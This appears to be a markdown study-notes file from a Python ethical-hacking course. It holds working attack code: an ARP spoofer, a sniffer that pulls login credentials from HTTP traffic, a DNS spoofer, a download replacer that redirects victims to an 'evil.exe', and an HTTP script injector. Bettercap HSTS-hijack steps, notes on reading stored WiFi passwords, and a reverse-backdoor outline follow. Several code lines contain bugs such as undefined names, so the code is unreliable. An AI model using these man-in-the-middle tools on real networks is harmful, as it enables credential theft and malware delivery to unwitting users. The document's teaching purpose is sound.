# <span style="color:red"> Penetration Testing and Ethical Hacking with Python <span>

## Penetration Testing (Pentest) Content:
1.  What is Penetration Testing
2.  Cyber Security Tests and Audits
    - Security Audits
    - Vunerability Assesment
    - Penetration Tests
3. Asset, Threat, Vulnerability, Risk
4. Pentest Approaches 
    - Black Box, Grey Box, White Box
5. Planning a Pentest
    - Purpose 
    - Scope
    - Requirements 
    - Restrictions
6.Penetration Test Phases
    - Reconnaissance
    - Scanning 
    - Exploitation and Post Exploitation 
    - Covering Tracks
    - Reporting



## MAC Address
A MAC is an acronym for ***Media Access Control***.   
The MAC address is used to identify devices on the indetify devices in order to transfer resources from one device to another device.


## The MAC address can be changed
1. Increase ***anonimity***
2. ***Impersonate*** other devices
3. ***Bypass*** filters

To change the MAC address of an interface <interface_name> in terminal use the following commands
- ifconfig <interface_name> down
- ifconfig <interface_name> hw ether **new MAC address**
- ifconfig <interface_name> up







# MAC changer Program
> Goal is to check if the MAC address was changed

#### Steps for the algorithm
1. Execute and read ifconfig
2. Read the MAC address from the output
3. Chech if MAC ifconfig is what the requested.
4. Print appropriate message.

The following is a complete program  to change MAC address.
```python

#!/usr/bin/env python3

# Importing modules
import subprocess, argparse, re


def get_current_mac(interface):
    ''' 
    This function gets the current mac address
    It takes an interface as argument and returns 
    the mac address
    '''
    ifconfig_interface_output = subprocess.check_output(["ifconfig", interface])
    search_pattern = "\w\w:\w\w:\w\w:\w\w:\w\w:\w\w" #regular experession to find the MAC address.
    mac_address = re.search(search_pattern, str(ifconfig_interface_output))# Extract MAC address from ifconig_output

    if mac_address:
        return mac_address.group(0)
    else:
       return 
        
def change_mac_address(interface, new_mac_addr) -> None:
    ''' 
    This function changes the mac address from.
    It takes two arguments, the interface and the new MAC address.
    '''
    print(f'[+] Changing MAC address for "{interface}"')
    subprocess.call(["ifconfig", interface, "down"])
    subprocess.call(["ifconfig", interface, "hw", "ether", new_mac_addr])
    subprocess.call(["ifconfig", interface, "up"])

def get_gommanline_args():
    """
    This function gets the command line arguments.
    The command line arguments are interface and mac address.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="Interface to change MAC address.")
    parser.add_argument("-m", "--mac", help="New MAC address.")

    args =  parser.parse_args()
    if not args.interface:
        parser.error("[-] An interface not specified. Use -h or --help for more info.")
    if not args.mac:
        parser.error("[-] A new MAC address not specified. Use -h or --help for more info.")
    return args

def is_interface(interface)->bool:
    """
    This function checks whether the given argument is an interface.
    It returns True if the interface is a part of a list and False otherwise.
    """
    ifconfig_result = str(subprocess.check_output(["ifconfig"]))
    interfaces_list = [i.strip("', \\n") for i in re.findall("(\S?\w+):\s", ifconfig_result)]
    return interface in interfaces_list
    
def main():
    args = get_gommanline_args()
    #print(f'Command Line: {commandline_output.interface}')
    interface = args.interface
    new_mac_addr = args.mac
    #print(new_mac_addr)

    boolean = is_interface(interface)
    if boolean:
        current_mac = get_current_mac(interface)
        if current_mac:
            print(f'[+] Current MAC address for "{interface}": {current_mac}')
            change_mac_address(interface, new_mac_addr)
        else:
            print(f'[-] MAC address for "{interface}": {current_mac}')

        #Check to see if MAC address got changed.

        current_mac = get_current_mac(interface)
        if current_mac == new_mac_addr:
            print(f'[+] MAC address successfully changed !!!')
            print(f'[+] Current MAC address for "{interface}": {current_mac}')
    else:
        print(f"[-] Invalid interface")

if __name__ == "__main__":
    main()

```

## <span style="color:red">Information Gathering: Reconnaisance <span>
### Section 4:  Programming a Network Scanner
Information gathering is one of the most important steps in hacking or penetration testing.

## Network Scanner
Network scanning helps to 
- ***Discover*** all devices on the network
- Display their ***IP address***
- Display their ***MAC address***
> Some tools for network scanning are *Nmap* and *netdiscover*

We will use python to write a network scanner.

##  ARP (Address Resolution Protocol)

To implement the APR, we use the python module called ***scapy*** See the [Scapy Documentaion](https://scapy.readthedocs.io/en/latest/index.html)

## Network Scanner Algorithm 
> The goal of this algoritm is to discover all clients on a network

#### Steps in the algorithm
1. Create an ARP request directed to braodcast MAC address asking for IP
    - Use ARP to ask which connected device has target the IP
    - Set destination MAC to broadcast MAC
2. Send packet and receive response
3. Print result

## Python code for network scanning
```python 
#!/usr/bin/env python3

import  argparse
import scapy.all as scapy
from prettytable import PrettyTable


def get_gommanline_args()->str:
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iprange", dest="iprange", help="Range of ip addresses.")
    args = parser.parse_args()

    if not args.iprange:
        parser.error("[-] An ip range is required.")
    return args.iprange


def scan(ip)->list:
    """
    This is function creates an ARP request directed to broadcast MAC address for ip.
    """
    arp_request = scapy.ARP(pdst = ip) #creating arp request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #broadcast MAC address for ip.

    arp_request_broadcast = broadcast/arp_request #Create an ARP broadcast/request packet
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=4, verbose=0)

    hosts = []
    for query_ans in answered_list:
        hosts.append({"ip": query_ans[1].psrc, "mac":query_ans[1].hwsrc})
    return hosts

def display_hosts(hosts)->None:
    table = PrettyTable(["IP", "MAC"])
    for host in hosts:
        table.add_row([host['ip'], host['mac']], divider=True)
    print(table)

if __name__ == "__main__":
    ip_range = get_gommanline_args()
    hosts = scan(ip_range)
    display_hosts(hosts)
    
```

# Section 5 Writing an ARP Spoofer
In cybersecurity, ‘spoofing’ is when fraudsters pretend to be someone or something else to win a person’s trust. The motivation is usually to gain access to systems, steal data, steal money, or spread malware.

## How to run an ARP spoof attack using command ***arpspoof***:
The following command fools the target witb IP address 10.0.2.4.
> arpspoof -i etho  -t 10.0.2.4 10.0.2.1

The following command fools the router with IP address 10.0.2.1.
> arpspoof -i etho  -t 10.0.2.1 10.0.2.4

Before executing the commands above, run the following command to enable packet fowarding: 
> echo 1 > /proc/sys/net/ipv4/ip_forward

## Creating an ARP response using python.
Use the following python code to create an ARP responce
```python 
#!/usr/bin/env python3

# ---- Algorithm ----
# 1. Get mac address of target using target IP -- DONE
# 2. Create a response from the target host
# 3. Restore to normal. 
# 4. Optional: Create a command line function

import scapy.all as scapy
import argparse, time

def get_cmd_args():
   parser = argparse.ArgumentParser(
      prog="arp_spoof",
      description="Man in the middle",
      epilog="Thank you for using %(prog)s :)"
   )
   parser.add_argument("-t", "--target", help="Ip address of target host")
   parser.add_argument("-s", "--source", help="Ip address of router")
   args = parser.parse_args()
   return args

def get_mac(ip) -> str:
    # Create an ARP packet
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    layer2_packet = broadcast/arp_request

    #Send packet
    answered = scapy.srp(layer2_packet, timeout=1, verbose=0)[0]
    return answered[0][1].hwsrc
    
def spoof(target_ip, src_ip):
    target_mac = get_mac(target_ip)
    response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=src_ip)
    scapy.send(response_packet, verbose=Falsee)

def restore_arp_table(target_ip, src_ip):
    dst_mac = get_mac(target_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=dst_mac, psrc=source_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False)


def run():
    cmd_args = get_cmd_args()
    target_ip = cmd_args.target
    src_ip = cmd_args.source
    try:
        sent_packet_counter = 0
        while True:
            spoof(target_ip, src_ip) # Fool the targe host
            spoof(src_ip, target_ip) # Fool the router
            sent_packet_counter += 2
            print(f'[+] Press Ctrl+C to terminate. \n Packets sent: {sent_packet_count}', end="\r", flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f'\n CTRL+C detected ... Restoring ARP tables ... please wait ... Quitting')
        restore(target_ip, src_ip)
        restore(src_ip, target_ip)

if __name__ == "__main__":
    run()
```

# Section 6 Writing a packet sniffer
Scapy has a function called ***sniff***

```python

#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load_byte = packet[scapy.Raw].load
        load_str = str(load_byte)
        keywords = ["username", "user", "login", "password", "pass", "email", "phone number"]
        for kw in keywords:
            if kw in load_str:
                return load_str
                #print(f'\n\n [+] Possibe username/password >> {load}\n\n')
                #break


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = get_url(packet).decode()
        print(f"[+] HTTP Request >> {url}")

        login_info = get_login_info(packet)
        if login_info:
            print(f'\n\n [+] Possibe username/password >> {login_info}\n\n')
        
    

sniffer("eth0")
```

# Section 7: Writing a DNS Spoofer
- Scapy can be used to
    1. Create a packet
    2. Analyse packets
    3. Send and receive packets
- It cannot be used to intercept packets/flows.

> Previously we wrote a program (arp_spoof.py) to place Kali linux as a man-in-the-middle.
> Also, we have a program (packet_sniffer.py) that can sniffs data packets. 

### Intercepting Packets - Creating a Proxy
We want to intercept packets, modify them and send then release the packets after modificatrion.

### Redirection of packets using <span style="color:red"> iptables <span>
Iptables is a firewall program for Linux. It will monitor traffic from and to your server using tables. These tables contain sets of rules, called chains, that will filter incoming and outgoing data packets.



The linux command to traps incoming traffic:
> iptables -I FORWARD -j NFQUEUE --queue-num 0

Modify trapped packets using a module called netfilterqueue
```python
#!/usr/bin/env python3 

import netfilterqueue as nq

def process_packet(packet):
    print(packet)
    # packet.drop()
    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

After this flush the queue with the folowing command
> iptables --flush

#### Test on a local machine: 
Use the output and input chain of the iptables. 
> iptables -I OUTPUT -j NFQUEUE --queue-num 0
> iptables -I INPUT -j NFQUEUE --queue-num 0

#### Converting packets to scapy packets
```python
#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())
    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

#### DNS spoofing
```python
#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy

web_add = "www.bccancer.bc.ca"
redirect_ip = "10.0.2.15"

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #Checking for DNS response using DNSRR. Use DNSQR for DNS requests
    if scapy_packet.haslayer(scapy.DNSRR):
        qname =scapy_packet[scapy.DNSQR].qname
        #print(qname)
        if web_add in str(qname):
            print("[+] Spoofing target")

            #Creating a DNS response and redirect it to any ip address
            answer = scapy.DNSRR(rrname = qname, rdata= redirect_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # delete the len and chkcum in the IP and UDP layers
            # to prevent corruption  our modified data
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

        #print(scapy_packet.show())
    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


```
> Always run iptables --flush after modifying iptables.


# Section 8: Writing a File Interceptor
In this section we're going to modify data in the htttp layer and in particular replace downlaod requests. 
> <span style="color:red;"> Note: packet sent over the http layer are placed in the Raw layer. </span>

#### Filtering Traffic based on the port used
The goal is to write a program that can detect whrn a user requests to download  a dertian file. When detected, we will serve the user with a different file.

 The template for this program will be the DNS spoof progam from the previous section.

 We need to check for http(s) request and response.

 > An example of a packet with different layers. In particular this is a request being sent beacuce in the TCP layer, the field dport is set to http(s).

 ```http layer

 None
###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 79
  id        = 23667
  flags     = DF
  frag      = 0
  ttl       = 64
  proto     = tcp
  chksum    = 0xc1c2
  src       = 10.0.2.15
  dst       = 34.117.237.239
  \options   \
###[ TCP ]### 
     sport     = 40994
     dport     = https
     seq       = 2539263128
     ack       = 898289
     dataofs   = 5
     reserved  = 0
     flags     = PA
     window    = 64028
     chksum    = 0xb848
     urgptr    = 0
     options   = []
###[ Raw ]### 
        load      = '\x17\x03\x03\x00"
 ```

A response will have the sport set to http(s)

```python
#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            print(f'HTTP Request')
            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print(f'HTTP Response')
            print(scapy_packet.show())


    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


```

#### Analysing and Intercepting HTTP requests and moifying Responses
> This is an http request
```http layer 
HTTP Request
###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 473
  id        = 58839
  flags     = DF
  frag      = 0
  ttl       = 64
  proto     = tcp
  chksum    = 0x3ed3
  src       = 10.0.2.15
  dst       = 143.186.120.171
  \options   \
###[ TCP ]### 
     sport     = 38990
     dport     = http
     seq       = 2581237551
     ack       = 2682544
     dataofs   = 5
     reserved  = 0
     flags     = PA
     window    = 64240
     chksum    = 0x75c
     urgptr    = 0
     options   = []
###[ Raw ]### 
        load      = 'GET /testsite/downloads/Hello.txt HTTP/1.1\r\nHost: demo.borland.com\r\nUser-Agent: 
        Mozilla/5.0 (X11; Linux x86_64; rv:102.0) ...






HTTP Response
###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 502
  id        = 22341
  flags     = 
  frag      = 0
  ttl       = 255
  proto     = tcp
  chksum    = 0x4e48
  src       = 143.186.120.171
  dst       = 10.0.2.15
  \options   \
###[ TCP ]### 
     sport     = http
     dport     = 38990
     seq       = 2682544
     ack       = 2581237984
     dataofs   = 5
     reserved  = 0
     flags     = PA
     window    = 32335
     chksum    = 0xd0f2
     urgptr    = 0
     options   = []
###[ Raw ]### 
        load      = 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\ ...
```


> ack = 2682544 in  Request is same as seq = 2682544 in response: This shows that the response corresponds to the request made.

#### Intercepting and Replacing downloads on the network
1. Run the arp_spoof.py to become man in the middle
2. Run the replace_download.py to replace the victims download request.

```python
#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy

ack_list = []
attack_load = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/evil-files/evil.exe\n\n"

def set_load(scapy_packet, load):
    print(f'[+] replacing file')
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet
    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            print(f'HTTP Request')
            if '.txt'.encode() in scapy_packet[scapy.Raw].load:
                print(f'[+] txt Request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print(f'HTTP Response')
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_scapy_packet = set_load(scapy_packet, attack_load)

                packet.set_payload(bytes(modified_scapy_packet))
                #print(scapy_packet.show())


    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

# Section 9: Writing a Code Injector
In http requests, removing the ***Accept-Encoding: gzip, ...*** from the load in the raw layer will allow the browzer present html in plain text.


### Code for injection
```python
#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy
import re

def set_load(scapy_packet, load):
    print(f'[+] replacing file')
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet
    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #print(type(scapy_packet))
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            print(f'HTTP Request')
            load=re.sub("Accept-Encoding:.*?\r\n".encode(), "".encode(), load)
            #print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print(f'HTTP Response')
            injection_code = "<script>alert('Test');</script>"
            load = load.replace("</body>".encode(), (injection_code+"</body>").encode())

            # Rexgex: Non-capturing group
            content_length_search = re.search("(?:Content-Length:\s)(\d*)".encode(), load)
            
            if content_length_search and "text/html".encode() in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length).encode())
                print(f'Previous content length: {int(content_length)}\
                     \n Current content length: {new_content_length}')
            #print(scapy_packet.show()) 

        # This gets executed if the load is modified   
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))


    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


```


# Section 10: Bypassing HTTPS
- Watch again
Use the following implementation of a network penetetrating tool called ***bettercap*** 
> bettercap - iface eth0 -caplet hstshijack/hstshijac
> bettercap: replce  80 with 8080 in replace_download.py. 


- Need to modify the ports in code_injector program


> <span style="color:red;"> Some websites use use hsts: Here, bypassing https fails for now. </span>


### Bypassing https and Sniffing Loging credentials.
1. Run packet_sniffer.py
2. Run arp_spoof.py to make attaker MITM.
3. Execute the command
    >  bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap

### Replacing downloads on https
1. Run arp_spoof.py to make attaker MITM.
2. Execute the command
    > bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap
3. Run the following commands:
    > iptables -I INPUT -j NFQUEUE --queue-num 0
    > iptables -I OUTPUT -j NFQUEUE --queue-num 0 
4. Run replace_download_https.py 

### Injecting code in https pages
1. Run arp_spoof.py to make attaker MITM.
2. Execute the command
    > bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap
3. Run the following commands:
    > iptables -I INPUT -j NFQUEUE --queue-num 0
    > iptables -I OUTPUT -j NFQUEUE --queue-num 0 
4. Run code_injection_https.py 


# Section 11: Writing an ARP Spoof detector
```python
#!/usr/bin/env python3

import scapy.all as scapy

def get_mac(ip)-> str:
   arp_request = scapy.ARP(pdst = ip)
   broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
   arp_request_broadcast = broadcast/arp_request
   answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
   return answered_list[0][1].hwsrc

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
        try:
            real_mac = get_mac(packet[scapy.ARP].psrc)
            response_mac = packet[scapy.ARP].hwsrc
            if real_mac != response_mac:
                print(f"[+] You're under attack !!")
        except IndexError:
            pass
        #print(packet.show())

       
        
    

sniffer("eth0")
```

# Section 12: Writing Malware
#### Getting Wifi Passwords on Linux
On Linux, all previously connected networks are located in the folder 
> /etc/NetworkManager/system-connections as INI files. So we just have to read the files and print the information.


# Section 13: Malware-Keylogger
Writing a program that records keys pressed on the keyboard.
We nned a library called pynput.

# Section 14: Malware-Backdoor
### Reverse Backdoor
- Access file system
- Execute system commands
- Download files
- Upload files
- Persistence

Backdoors allow an attacker to communicate with target system and use the system as though  the attacker is the owner. The attacker is abble to run system commands of the target system.

## The Socket module

- Backdoor: bind/direct connection. Not a good way for backdoor
- Backdoor reverse connection 


### Making a connection with ncat
> Use the command: nc -vv -l -p port_number 


### Serialization

Serialization refers to the process of converting the object or the data structures into a format where they can be stored or obtained later. Since the data is transformed and stored in another format, it provides the feature of restoring and deserializing the original data from the serialized format. In addition to the data conversion, serialization even provides the opportunity to reduce the data size so that it can fit into the required disk space or bandwidth.
